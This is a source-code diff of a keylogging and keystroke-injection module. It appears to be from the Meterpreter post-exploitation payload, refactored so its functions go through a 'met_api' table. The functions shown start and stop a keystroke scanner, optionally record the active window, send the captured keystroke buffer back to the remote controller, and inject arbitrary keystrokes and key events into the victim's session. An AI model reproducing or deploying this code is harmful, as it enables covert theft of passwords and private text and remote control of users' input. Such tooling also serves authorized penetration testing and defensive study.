@@ -1,4 +1,5 @@
 #include "precomp.h"
+#include "common_metapi.h"
 #include "keyboard.h"
 #include <tchar.h>
 #include <Psapi.h>
@@ -17,11 +18,11 @@ INT ui_resolve_raw_api();
 
 DWORD request_ui_enable_keyboard(Remote *remote, Packet *request)
 {
-	Packet *response = packet_create_response(request);
+	Packet *response = met_api->packet.create_response(request);
 	BOOLEAN enable = FALSE;
 	DWORD result = ERROR_SUCCESS;
 
-	enable = packet_get_tlv_value_bool(request, TLV_TYPE_BOOL);
+	enable = met_api->packet.get_tlv_value_bool(request, TLV_TYPE_BOOL);
 
 	// If there's no hook library loaded yet
 	if (!hookLibrary)
@@ -40,7 +41,7 @@ DWORD request_ui_enable_keyboard(Remote *remote, Packet *request)
 		result = GetLastError();
 
 	// Transmit the response
-	packet_transmit_response(result, remote, response);
+	met_api->packet.transmit_response(result, remote, response);
 
 	return ERROR_SUCCESS;
 }
@@ -234,10 +235,10 @@ LRESULT CALLBACK ui_keyscan_wndproc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM l
 
 DWORD request_ui_start_keyscan(Remote *remote, Packet *request)
 {
-	Packet *response = packet_create_response(request);
+	Packet *response = met_api->packet.create_response(request);
 	DWORD result = ERROR_SUCCESS;
 
-	bool track_active_window = packet_get_tlv_value_bool(request, TLV_TYPE_KEYSCAN_TRACK_ACTIVE_WINDOW);
+	bool track_active_window = met_api->packet.get_tlv_value_bool(request, TLV_TYPE_KEYSCAN_TRACK_ACTIVE_WINDOW);
 
 	// set appropriate logging function
 	(track_active_window == true) ? (gfn_log_key = &ui_log_key_actwin) : (gfn_log_key = &ui_log_key);
@@ -266,7 +267,7 @@ DWORD request_ui_start_keyscan(Remote *remote, Packet *request)
 	}
 
 	// Transmit the response
-	packet_transmit_response(result, remote, response);
+	met_api->packet.transmit_response(result, remote, response);
 	return ERROR_SUCCESS;
 }
 
@@ -277,7 +278,7 @@ DWORD request_ui_start_keyscan(Remote *remote, Packet *request)
 
 DWORD request_ui_stop_keyscan(Remote *remote, Packet *request)
 {
-	Packet *response = packet_create_response(request);
+	Packet *response = met_api->packet.create_response(request);
 	DWORD result = ERROR_SUCCESS;
 
 	if (tKeyScan) {
@@ -291,7 +292,7 @@ DWORD request_ui_stop_keyscan(Remote *remote, Packet *request)
 	}
 
 	// Transmit the response
-	packet_transmit_response(result, remote, response);
+	met_api->packet.transmit_response(result, remote, response);
 	return ERROR_SUCCESS;
 }
 
@@ -301,12 +302,12 @@ DWORD request_ui_stop_keyscan(Remote *remote, Packet *request)
 
 DWORD request_ui_get_keys(Remote *remote, Packet *request)
 {
-	Packet *response = packet_create_response(request);
+	Packet *response = met_api->packet.create_response(request);
 	DWORD result = ERROR_SUCCESS;
 
   if (tKeyScan) {
 		// This works because NULL defines the end of data (or if its wrapped, the whole buffer)
-		packet_add_tlv_string(response, TLV_TYPE_KEYS_DUMP, (LPCSTR)g_keyscan_buf);
+		met_api->packet.add_tlv_string(response, TLV_TYPE_KEYS_DUMP, (LPCSTR)g_keyscan_buf);
 		memset(g_keyscan_buf, 0, KEYBUFSIZE);
 		g_idx = 0;
 	}
@@ -315,7 +316,7 @@ DWORD request_ui_get_keys(Remote *remote, Packet *request)
 	}
 
 	// Transmit the response
-	packet_transmit_response(result, remote, response);
+	met_api->packet.transmit_response(result, remote, response);
 	return ERROR_SUCCESS;
 }
 
@@ -325,13 +326,13 @@ DWORD request_ui_get_keys(Remote *remote, Packet *request)
 
 DWORD request_ui_get_keys_utf8(Remote *remote, Packet *request)
 {
-	Packet *response = packet_create_response(request);
+	Packet *response = met_api->packet.create_response(request);
 	DWORD result = ERROR_SUCCESS;
 	char *utf8_keyscan_buf = NULL;
 
 	if (tKeyScan) {
-		utf8_keyscan_buf = wchar_to_utf8(g_keyscan_buf);
-		packet_add_tlv_raw(response, TLV_TYPE_KEYS_DUMP, (LPVOID)utf8_keyscan_buf,
+		utf8_keyscan_buf = met_api->string.wchar_to_utf8(g_keyscan_buf);
+		met_api->packet.add_tlv_raw(response, TLV_TYPE_KEYS_DUMP, (LPVOID)utf8_keyscan_buf,
 			(DWORD)strlen(utf8_keyscan_buf) + 1);
 		memset(g_keyscan_buf, 0, KEYBUFSIZE);
 
@@ -345,7 +346,7 @@ DWORD request_ui_get_keys_utf8(Remote *remote, Packet *request)
 	}
 
 	// Transmit the response
-	packet_transmit_response(result, remote, response);
+	met_api->packet.transmit_response(result, remote, response);
   free(utf8_keyscan_buf);
 	return ERROR_SUCCESS;
 }
@@ -356,9 +357,9 @@ DWORD request_ui_get_keys_utf8(Remote *remote, Packet *request)
 
 DWORD request_ui_send_keys(Remote *remote, Packet *request)
 {
-	Packet *response = packet_create_response(request);
+	Packet *response = met_api->packet.create_response(request);
 	DWORD result = ERROR_SUCCESS;
-	wchar_t *keys = utf8_to_wchar(packet_get_tlv_value_string(request, TLV_TYPE_KEYS_SEND));
+	wchar_t *keys = met_api->string.utf8_to_wchar(met_api->packet.get_tlv_value_string(request, TLV_TYPE_KEYS_SEND));
 	if (keys) 
 	{
 		INPUT input[2] = {0};
@@ -388,7 +389,7 @@ DWORD request_ui_send_keys(Remote *remote, Packet *request)
 	}
 
 	// Transmit the response
-	packet_transmit_response(result, remote, response);
+	met_api->packet.transmit_response(result, remote, response);
 	return ERROR_SUCCESS;
 }
 
@@ -410,11 +411,11 @@ void ui_send_key(WORD keycode, DWORD flags)
 
 DWORD request_ui_send_keyevent(Remote *remote, Packet *packet)
 {
-	Packet *response = packet_create_response(packet);
+	Packet *response = met_api->packet.create_response(packet);
 	DWORD result = ERROR_SUCCESS;
 	Tlv data;
 
-	if ((packet_get_tlv(packet, TLV_TYPE_KEYEVENT_SEND, &data)) == ERROR_SUCCESS)
+	if ((met_api->packet.get_tlv(packet, TLV_TYPE_KEYEVENT_SEND, &data)) == ERROR_SUCCESS)
 	{
 		for (unsigned int i=0;i<data.header.length;i+=8)
 		{
@@ -441,7 +442,7 @@ DWORD request_ui_send_keyevent(Remote *remote, Packet *packet)
 	}
 
 	// Transmit the response
-	packet_transmit_response(result, remote, response);
+	met_api->packet.transmit_response(result, remote, response);
 	return ERROR_SUCCESS;
 }
 
